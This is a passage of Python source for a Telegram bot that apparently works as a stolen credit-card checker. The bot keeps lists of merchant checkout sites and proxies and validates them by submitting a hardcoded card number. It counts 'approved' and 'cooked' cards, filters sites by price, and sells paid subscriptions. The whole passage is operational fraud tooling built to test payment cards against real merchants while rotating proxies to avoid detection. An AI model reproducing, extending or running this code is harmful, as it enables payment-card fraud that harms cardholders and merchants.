                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , 'INCORRECT_NUMBER']):
                
                # Get price from response or use default
                price = response.get("Price", "0.00")
                
                # Check if site already exists
                site_exists = any(site['url'] == url for site in sites_data['sites'])
                
                if not site_exists:
                    # Add site to list
                    sites_data['sites'].append({
                        "url": url,
                        "price": price,
                        "last_response": response.get("Response", "Unknown"),
                        "gateway": response.get("Gateway", "Unknown")
                    })
                    added_count += 1
                    
                    # Update status with success
                    try:
                        bot.edit_message_text(
                            f"🔍 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {total_count} 𝐒𝐢𝐭𝐄𝐬...\n\n✅ 𝐀𝐝𝐝𝐞𝐝: {url}\n𝐀𝐝𝐝𝐞𝐝: {added_count}/{total_count}\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count}/{total_count}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
                else:
                    skipped_count += 1
                    # Update status with skip (duplicate)
                    try:
                        bot.edit_message_text(
                            f"🔍 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐢𝐠 {total_count} sites...\n\n⚠️ 𝐒𝐤𝐢𝐩𝐩𝐞𝐝 (duplicate): {url}\n𝐀𝐝𝐝𝐞𝐝: {added_count}/{total_count}\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count}/{total_count}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
            else:
                skipped_count += 1
                # Update status with skip (invalid response)
                try:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ 𝐒𝐤𝐢𝐩𝐩𝐞𝐝 (invalid): {url}\nResponse: {response.get('Response', 'NO_RESPONSE')}\n𝐀𝐝𝐝𝐞𝐝: {added_count}/{total_count}\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        else:
            skipped_count += 1
            # Update status with skip (no response)
            try:
                bot.edit_message_text(
                    f"🔍 Checking {total_count} sites...\n\n❌ Skipped (no response): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        time.sleep(1)
    
    # Save updated sites
    save_json(SITES_FILE, sites_data)
    
    # Final update
    bot.edit_message_text(
        f"✅ 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝!\n\n𝐀𝐝𝐝𝐞𝐝: {added_count} new sites\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count} sites\n𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬: {len(sites_data['sites'])}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['addpro'])
def handle_add_proxy(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_add_proxy, args=(message,))
    thread.start()

def process_add_proxy(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide proxy to add. Format: /addpro host:port:user:pass")
        return
    
    proxy = message.text.split(' ', 1)[1]
    
    # Send initial message
    status_msg = bot.reply_to(message, f"🔍 Testing proxy: {proxy.split(':')[0]}...")
    
    # Test the proxy with a random site and sample card
    if sites_data['sites']:
        site_obj = random.choice(sites_data['sites'])
        test_cc = "5242430428405662|03|28|323"
        response = check_site(site_obj['url'], test_cc, proxy)
        
        if response:
            response_upper = response.get("Response", "").upper()
            # Check if response is valid
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED']):
                
                # Check if proxy already exists
                if proxy not in proxies_data['proxies']:
                    # Add proxy to list
                    proxies_data['proxies'].append(proxy)
                    save_json(PROXIES_FILE, proxies_data)
                    bot.edit_message_text(
                        f"✅ Proxy added successfully!\n\nTotal proxies: {len(proxies_data['proxies'])}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                else:
                    bot.edit_message_text(
                        f"⚠️ Proxy already exists!\n\nTotal proxies: {len(proxies_data['proxies'])}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                return
            else:
                bot.edit_message_text(
                    f"❌ Invalid response from proxy: {response_upper}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
                return
        else:
            bot.edit_message_text(
                "❌ No response from proxy. Invalid proxy or test failed.",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
            return
    
    bot.edit_message_text(
        "❌ No sites available to test proxy.",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['clean'])
def handle_clean_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_clean_sites, args=(message,))
    thread.start()

def process_clean_sites(message):
    # Send initial message
    total_sites = len(sites_data['sites'])
    status_msg = bot.reply_to(message, f"🔍 Cleaning {total_sites} sites...\n\nChecked: 0/{total_sites}\nValid: 0\nInvalid: 0")
    
    # Test all sites and remove invalid ones
    valid_sites = []
    test_cc = "5242430428405662|03|28|323"
    
    for i, site_obj in enumerate(sites_data['sites']):
        # Update status
        try:
            bot.edit_message_text(
                f"🔍 Cleaning {total_sites} sites...\n\nChecking: {site_obj['url']}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites)}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        response = check_site(site_obj['url'], test_cc)
        if response:
            response_upper = response.get("Response", "").upper()
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICient_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED']):
                # Update the site's last response
                site_obj['last_response'] = response.get("Response", "Unknown")
                site_obj['gateway'] = response.get("Gateway", "Unknown")
                valid_sites.append(site_obj)
                # Update with response
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_sites} sites...\n\n✅ Valid: {site_obj['url']}\nResponse: {response.get('Response', 'VALID')}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites) + 1}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
            else:
                # Update with invalid response
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_sites} sites...\n\n❌ Invalid: {site_obj['url']}\nResponse: {response.get('Response', 'INVALID')}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites) + 1}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        else:
            # Update with no response
            try:
                bot.edit_message_text(
                    f"🔍 Cleaning {total_sites} sites...\n\n❌ No response: {site_obj['url']}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites) + 1}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        time.sleep(0.5)
    
    sites_data['sites'] = valid_sites
    save_json(SITES_FILE, sites_data)
    
    # Final update
    removed_count = total_sites - len(valid_sites)
    bot.edit_message_text(
        f"✅ Site cleaning completed!\n\nRemoved: {removed_count} invalid sites\nTotal sites: {len(valid_sites)}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['cleanpro'])
def handle_clean_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_clean_proxies, args=(message,))
    thread.start()

def process_clean_proxies(message):
    # Send initial message
    total_proxies = len(proxies_data['proxies'])
    status_msg = bot.reply_to(message, f"🔍 Cleaning {total_proxies} proxies...\n\nChecked: 0/{total_proxies}\nValid: 0\nInvalid: 0")
    
    # Test all proxies and remove invalid ones
    valid_proxies = []
    test_cc = "5242430428405662|03|28|323"
    
    if sites_data['sites']:
        site_obj = random.choice(sites_data['sites'])
        
        for i, proxy in enumerate(proxies_data['proxies']):
            # Update status
            try:
                bot.edit_message_text(
                    f"🔍 Cleaning {total_proxies} proxies...\n\nChecking: {proxy.split(':')[0]}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies)}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
            
            response = check_site(site_obj['url'], test_cc, proxy)
            if response:
                response_upper = response.get("Response", "").upper()
                if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                                   'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                                   'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED']):
                    valid_proxies.append(proxy)
                    # Update with valid response
                    try:
                        bot.edit_message_text(
                            f"🔍 Cleaning {total_proxies} proxies...\n\n✅ Valid: {proxy.split(':')[0]}\nResponse: {response.get('Response', 'VALID')}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies) + 1}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
                else:
                    # Update with invalid response
                    try:
                        bot.edit_message_text(
                            f"🔍 Cleaning {total_proxies} proxies...\n\n❌ Invalid: {proxy.split(':')[0]}\nResponse: {response.get('Response', 'INVALID')}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies) + 1}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
            else:
                # Update with no response
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_proxies} proxies...\n\n❌ No response: {proxy.split(':')[0]}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies) + 1}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
            
            # Small delay to avoid rate limiting
            time.sleep(1)
    
    proxies_data['proxies'] = valid_proxies
    save_json(PROXIES_FILE, proxies_data)
    
    # Final update
    removed_count = total_proxies - len(valid_proxies)
    bot.edit_message_text(
        f"✅ Proxy cleaning completed!\n\nRemoved: {removed_count} invalid proxies\nTotal proxies: {len(valid_proxies)}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['rmsites'])
def handle_remove_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(sites_data['sites'])
    sites_data['sites'] = []
    save_json(SITES_FILE, sites_data)
    bot.reply_to(message, f"✅ All {count} sites removed.")

@bot.message_handler(commands=['rmpro'])
def handle_remove_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(proxies_data['proxies'])
    proxies_data['proxies'] = []
    save_json(PROXIES_FILE, proxies_data)
    bot.reply_to(message, f"✅ All {count} proxies removed.")

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return

    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"

    stats_msg = f"""
┏━━━━━━━⍟
┃ <strong>📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬</strong> 📈
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐒𝐢𝐭𝐞𝐬</strong> ↣ <code>{len(sites_data['sites'])}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐢𝐞𝐬</strong> ↣ <code>{len(proxies_data['proxies'])}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐔𝐩𝐭𝐢𝐦𝐞</strong> ↣ <code>{uptime_str}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['approved']}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['cooked']}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐃𝐞𝐜𝐜𝐥𝐢𝐧𝐞𝐓 ❌</strong> ↣ <code>{stats_data['declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐌𝐚𝐬𝐬 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['mass_approved']}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐌𝐎𝐬𝐬 𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['mass_cooked']}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐌𝐚𝐬𝐬 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</strong> ↣ <code>{stats_data['mass_declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬</strong> ↣ <code>{stats_data['approved'] + stats_data['cooked'] + stats_data['declined'] + stats_data['mass_approved'] + stats_data['mass_cooked'] + stats_data['mass_declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>
"""

    bot.reply_to(message, stats_msg, parse_mode="HTML")

@bot.message_handler(commands=['viewsites'])
def handle_view_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    if not sites_data['sites']:
        bot.reply_to(message, "No sites available.")
        return
    
    # Header
    sites_list = """

<strong>🌐 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐒𝐢𝐭𝐞𝐬</strong> 🔥

"""

    # Table header
    sites_list += "━━━━━━━━━━━━━━━━━━━\n"
    sites_list += "<strong>𝐒𝐢𝐭𝐞</strong> ↣          <strong>𝐏𝐫𝐢𝐜𝐞</strong> ↣             <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞𝐬</strong>\n"
    sites_list += "━━━━━━━━━━━━━━━━━━━\n"
    
    # List sites
    for i, site in enumerate(sites_data['sites'][:20]):  # Show first 20 sites
        url_short = site['url'][:20] + "..." if len(site['url']) > 20 else site['url']
        price = site.get('price', '0.00')
        response = site.get('last_response', 'Unknown')
        response_short = response[:15] + "..." if response and len(response) > 15 else response

        sites_list += f"🔹 <code>{url_short}</code> ↣ 💲<strong>{price}</strong> ↣ <code>{response_short}</code>\n"

    # More sites note
    if len(sites_data['sites']) > 20:
        sites_list += f"\n...and <strong>{len(sites_data['sites']) - 20}</strong> more sites ⚡"

    sites_list += "\n━━━━━━━━━━━━━━━━━━━\n"
    sites_list += f"[<a href='https://t.me/stormxvup'>⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>"

    bot.reply_to(message, sites_list, parse_mode="HTML")

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    start_time = time.time()
    ping_msg = bot.reply_to(message, "<strong>🏓 Pong! Checking response time...</strong>", parse_mode="HTML")
    end_time = time.time()
    response_time = round((end_time - start_time) * 1000, 2)
    
    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"
    
    bot.edit_message_text(
        f"<strong>🏓 Pong!</strong>\n\n"
        f"<strong>Response Time:</strong> {response_time} ms\n"
        f"<strong>Uptime:</strong> {uptime_str}\n\n"
        f"<strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>",
        chat_id=message.chat.id,
        message_id=ping_msg.message_id,
        parse_mode="HTML"
    )

@bot.message_handler(commands=['restart'])
def handle_restart(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    restart_msg = bot.reply_to(message, "<strong>🔄 Restarting bot, please wait...</strong>", parse_mode="HTML")
    
    # Simulate restart process
    time.sleep(2)
    
    # Calculate uptime before restart
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"
    
    # Update the global start time without using global keyword
    # Since BOT_START_TIME is defined at module level, we can modify it directly
    # by using the global namespace
    globals()['BOT_START_TIME'] = time.time()
    
    bot.edit_message_text(
        f"<strong>✅ Bot restarted successfully!</strong>\n\n"
        f"<strong>Previous Uptime:</strong> {uptime_str}\n"
        f"<strong>Restart Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"<strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>",
        chat_id=message.chat.id,
        message_id=restart_msg.message_id,
        parse_mode="HTML"
    )

@bot.message_handler(commands=['setamo'])
def handle_set_amount(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Get unique price ranges from sites
    prices = set()
    for site in sites_data['sites']:
        try:
            price = float(site.get('price', 0))
            if price > 0:
                # Round to nearest 5 for grouping
                rounded_price = ((price // 5) + 1) * 5
                prices.add(rounded_price)
        except:
            continue
    
    # Create price options
    price_options = [5, 10, 20, 30, 50, 100]
    
    # Add available prices that are not in standard options
    for price in sorted(prices):
        if price <= 100 and price not in price_options:
            price_options.append(price)
    
    # Sort and ensure we have reasonable options
    price_options = sorted(price_options)
    price_options = [p for p in price_options if p <= 100][:8]  # Limit to 8 options
    
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # Add price buttons
    for price in price_options:
        markup.add(types.InlineKeyboardButton(f"BELOW {price}$", callback_data=f"set_price_{price}"))
    
    # Add "No Filter" and "Cancel" buttons
    markup.add(types.InlineKeyboardButton("❌ No Filter (All Sites)", callback_data="set_price_none"))
    markup.add(types.InlineKeyboardButton("🚫 Cancel", callback_data="set_price_cancel"))
    
    # Get current filter status
    current_filter = price_filter if price_filter else "No Filter"
    
    bot.send_message(
        message.chat.id,
        f"<strong>💰 Set Price Filter</strong>\n\n"
        f"<strong>Current Filter:</strong> {current_filter}$\n"
        f"<strong>Available Sites:</strong> {len(sites_data['sites'])}\n\n"
        f"Select a price range to filter sites:",
        parse_mode="HTML",
        reply_markup=markup
    )

@bot.message_handler(commands=['subs'])
def handle_subscribe(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /subs <user_id> <days>")
        return
    
    try:
        user_id = int(parts[1])
        days = int(parts[2])
        
        # Add user to approved list if not already there
        if user_id not in users_data["approved_users"]:
            users_data["approved_users"].append(user_id)
        
        # Set subscription expiry
        expiry_time = time.time() + (days * 24 * 60 * 60)
        users_data["subscriptions"][str(user_id)] = expiry_time
        save_json(USERS_FILE, users_data)
        
        expiry_date = datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d %H:%M:%S')
        bot.reply_to(message, f"✅ User {user_id} subscribed for {days} days.\nExpiry: {expiry_date}")
        
    except ValueError:
        bot.reply_to(message, "Invalid user ID or days format.")

@bot.message_handler(commands=['unsub'])
def handle_unsubscribe(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /unsub <user_id>")
        return
    
    try:
        user_id = int(parts[1])
        
        # Remove user from approved list
        if user_id in users_data["approved_users"]:
            users_data["approved_users"].remove(user_id)
        
        # Remove subscription
        if str(user_id) in users_data["subscriptions"]:
            del users_data["subscriptions"][str(user_id)]
        
        save_json(USERS_FILE, users_data)
        bot.reply_to(message, f"✅ User {user_id} unsubscribed and removed from approved list.")
        
    except ValueError:
        bot.reply_to(message, "Invalid user ID format.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('set_price_'))
def handle_price_callback(call):
    global price_filter
    
    if call.data == "set_price_cancel":
        bot.edit_message_text(
            "Price filter setting cancelled.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id
        )
        return
    
    if call.data == "set_price_none":
        price_filter = None
        settings_data['price_filter'] = None
        save_json(SETTINGS_FILE, settings_data)
        
        bot.edit_message_text(
            f"✅ Price filter removed! All {len(sites_data['sites'])} sites will be used for checking.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id
        )
        return
    
    # Extract price from callback data
    price_value = call.data.replace('set_price_', '')
    
    try:
        price_filter = float(price_value)
        settings_data['price_filter'] = price_filter
        save_json(SETTINGS_FILE, settings_data)
        
        # Count sites that match the filter
        filtered_sites = [site for site in sites_data['sites'] if float(site.get('price', 0)) <= price_filter]
        
        bot.edit_message_text(
            f"✅ Price filter set to <strong>BELOW {price_filter}$</strong>\n\n"
            f"<strong>Available Sites:</strong> {len(filtered_sites)}/{len(sites_data['sites'])}\n"
            f"<strong>Filter Applied:</strong> Only sites with price ≤ {price_filter}$ will be used.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML"
        )
    except ValueError:
        bot.answer_callback_query(call.id, "Invalid price value!")

if __name__ == "__main__":
    print("Bot started...")
    bot.infinity_polling()
